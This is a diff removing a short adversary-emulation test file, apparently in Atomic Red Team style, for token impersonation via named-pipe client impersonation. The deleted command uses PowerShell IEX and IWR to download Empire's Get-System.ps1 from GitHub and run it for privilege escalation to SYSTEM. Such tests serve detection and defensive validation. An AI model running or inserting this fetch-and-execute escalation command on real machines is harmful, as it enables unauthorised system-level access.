@@ -1,6 +1,0 @@
-#TechniqueName: Access Token Manipulation: Token Impersonation/Theft
-#AtomicTestName: Named pipe client impersonation
-#Language: ps1
-
-#commands
-IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'); Get-System -Technique NamedPipe -Verbose
